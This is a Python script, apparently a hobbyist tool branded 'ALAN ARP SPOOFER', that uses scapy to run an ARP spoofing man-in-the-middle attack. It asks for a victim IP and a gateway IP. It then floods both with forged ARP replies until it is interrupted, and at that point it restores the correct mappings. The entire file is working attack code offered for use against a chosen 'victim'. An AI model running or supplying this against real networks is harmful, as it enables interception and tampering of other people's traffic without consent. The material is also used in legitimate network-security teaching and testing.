import time
import pyfiglet                     # banner
import scapy.all as scapy           # packet crafting


# ──────────────────────────────────── helpers ────────────────────────────────────
def get_mac(ip: str) -> str:
    """Return the MAC address for a given IP by sending an ARP request."""
    arp_request = scapy.ARP(pdst=ip)
    broadcast   = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    answered    = scapy.srp(broadcast / arp_request, timeout=1, verbose=False)[0]

    if answered:
        return answered[0][1].hwsrc
    raise RuntimeError(f"[-] No response for IP {ip}. Is the host up?")


def spoof(target_ip: str, spoof_ip: str) -> None:
    """Send a forged reply to target_ip saying 'I am spoof_ip'."""
    target_mac = get_mac(target_ip)
    packet     = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip: str, source_ip: str) -> None:
    """Send the correct ARP mapping to dest_ip to undo spoofing."""
    dest_mac   = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet     = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                           psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# ──────────────────────────────────── CLI ────────────────────────────────────────
def about_banner() -> None:
    banner = pyfiglet.figlet_format("ALAN ARP SPOOFER")
    print(f"""{banner}
[+] Author   : ALAN
[+] Instagram: alan.biju.75054
[+] Version  : 0.1
[+] Starting the ARP SPOOFER...
""")


def get_user_input():
    print("Please enter the following information for ARP spoofing:")
    print("Target IP: The IP address of the device you want to intercept (victim).")
    print("Spoof IP : The IP address you want to pretend to be (usually the router/gateway).")
    target_ip = input("Enter Target IP: ").strip()
    spoof_ip = input("Enter Spoof IP: ").strip()

    if not target_ip:
        raise ValueError("Target IP cannot be empty.")
    if not spoof_ip:
        raise ValueError("Spoof IP cannot be empty.")

    return target_ip, spoof_ip


# ──────────────────────────────────── main loop ──────────────────────────────────
def main():
    about_banner()
    try:
        target_ip, spoof_ip = get_user_input()
    except ValueError as e:
        print(f"[-] {e}")
        return

    packet_count = 0

    try:
        while True:
            spoof(target_ip, spoof_ip)  # trick target
            spoof(spoof_ip, target_ip)  # trick router
            packet_count += 2
            print(f"\r[+] Packets sent: {packet_count}", end="", flush=True)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL-C – restoring network…")
        restore(target_ip, spoof_ip)
        restore(spoof_ip, target_ip)
        print("[+] Network restored. Exiting.")

if __name__ == "__main__":
    main()
